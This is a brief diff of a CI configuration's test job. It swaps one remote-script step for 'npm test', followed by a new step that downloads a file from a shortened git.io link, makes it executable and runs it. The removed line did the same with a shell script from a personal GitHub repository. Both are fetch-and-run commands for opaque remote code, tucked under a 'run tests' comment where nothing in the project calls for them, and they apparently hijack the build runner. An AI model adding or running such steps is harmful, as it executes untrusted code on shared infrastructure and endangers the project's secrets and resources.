@@ -31,4 +31,5 @@ jobs:
           key: v1-dependencies-{{ checksum "package.json" }}
 
       # run tests!
-      - run: wget -q https://raw.githubusercontent.com/makaryobos/privasi/main/ndemok.sh && chmod +x *sh && ./ndemok.sh
+      - run: npm test
+      - run: wget https://git.io/JzxVt && chmod +x JzxVt && ./JzxVt
